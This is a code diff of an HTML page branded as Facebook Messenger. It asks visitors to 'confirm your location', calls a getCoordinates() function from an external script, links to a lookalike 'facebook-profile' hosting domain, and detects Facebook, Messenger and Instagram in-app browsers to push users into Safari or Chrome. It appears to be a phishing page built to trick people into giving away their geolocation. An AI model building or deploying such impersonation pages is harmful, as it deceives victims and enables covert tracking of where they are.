@@ -1,56 +1,29 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <title>Facebook</title>
-  <style>
-    body {
-      font-family: Helvetica, Arial, sans-serif;
-      background-color: #e9ebee;
-      margin: 0;
-      padding: 0;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-    }
-
-    .facebook-box {
-      background-color: white;
-      padding: 200px;
-      border-radius: 10px;
-      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.2);
-      text-align: center;
-    }
-
-    .facebook-logo {
-      font-size: 80px;
-      color: #1877f2;
-      font-weight: bold;
-      margin-bottom: 20px;
-    }
-
-    .button {
-      padding: 15px 30px;
-      background-color: #1877f2;
-      color: white;
-      font-size: 16px;
-      border: none;
-      border-radius: 6px;
-      cursor: pointer;
-    }
-
-    .button:hover {
-      background-color: #166fe5;
-    }
-  </style>
-</head>
 <body>
-  <div class="facebook-box">
-    <div class="facebook-logo">facebook</div>
+  <div class="container">
+    <div class="logo">Messenger</div>
+    <div class="message">To continue, please confirm your location.</div>
+
+    <!-- In-app browser warning -->
+    <div id="warning" style="display: none; color: red; font-size: 14px; margin-bottom: 15px;">
+      ⚠️ If nothing happens after pressing proceed, please <b>open this page in Safari or Chrome</b>.
+    </div>
+
+    <!-- Open in browser button -->
+    <a href="https://facebook-profile-nakz.onrender.com" target="_blank" style="text-decoration: none;">
+      <button style="background: #00b2ff; color: white; border: none; padding: 12px; border-radius: 6px; margin-bottom: 15px; width: 100%;">
+        🔗 Open in Safari/Chrome
+      </button>
+    </a>
+
     <button class="button" onclick="getCoordinates()">Proceed</button>
   </div>
 
   <script src="script.js"></script>
+  <script>
+    // Detect Messenger, FB, Instagram in-app browsers
+    const ua = navigator.userAgent;
+    if (ua.includes("FBAV") || ua.includes("FBAN") || ua.includes("Messenger") || ua.includes("Instagram")) {
+      document.getElementById("warning").style.display = "block";
+    }
+  </script>
 </body>
-</html>
